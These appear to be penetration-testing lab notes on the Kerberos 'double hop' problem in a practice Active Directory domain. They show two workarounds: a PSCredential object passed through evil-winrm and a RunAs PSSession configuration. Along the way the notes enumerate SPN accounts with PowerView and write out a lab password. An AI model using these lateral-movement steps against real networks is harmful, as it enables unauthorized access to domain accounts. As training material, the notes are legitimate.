---
title: b-Kerberos "Double Hop" Problem
draft: false
tags:
  - kerberos
  - kerberoasting
  - pscredential
---
Kerberos Double Hop problem arises when attacker attempts to use Kerberos authentication across two or more hops. 

Let's say we have three hosts: Attack Host -> DEV01 -> DC01

Using credentials and evil-winrm, we managed to authenticate to DEV01.

Our credentials are not stored in memory for winrm therefore we will not be present on the system to authenticate to other resource on behalf of our user. 

This happens because user's kerberos TGT ticket is not sent to the remote session so user has no way to prove their identity. 

If *unconstrained delegation* is enabled on a server, it is likely we won't face the "Double Hop" problem.

In this case, when a user sends their TGS to access the target server, TGT ticket is sent along with the request. 

## Workarounds

- "nested" `Invoke-Command` to send creds after creating PSCredential object with every request. 

Here, we will learn about two methods:

- `evil-winrm` session
- GUI access to a Windows host

## M1: PSCredential Object

We can connect to remote host and set up a PSCredential object to pass our credentials again.

Below, we can see that command `get-domainuser -spn` is showing a error since we cannot pass our authentication on to the DC to query for the SPN accounts:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

If we check with `klist`, we only have a cached Kerberos ticket for our current server:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

### SetUp PSCredential

Let's set up PSCredential object and try above command again.

First we will set up our authentication:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Now let's try querying SPN account again using PowerView. We can see that it successfully works since we passed our credentials along with the command:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
```

## M2 Register PSSession Configuration

Above we have seen how to overcome "Double Hop" using `evil-winrm` and PSCredential object. 

What if we are on a domain joined host and can connect remotely to another using WinRM? Or we are from a Windows attack host and we are connecting to a target via WinRM using `Enter-PSSession cmdlet`?

Let's first set up a WinRM session on the remote host:

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

In order to interact with the DC from this remote host, we should register a new session configuration using `Register-PSSessionsConfiguration`:

```powershell-session
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess
```

Once above is done, let's restart WinRM service by `Restart-Service WinRM`.

Now, let's start a new PSSession using the named registered session we set up previously. Now double hop problem is eliminated:

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```


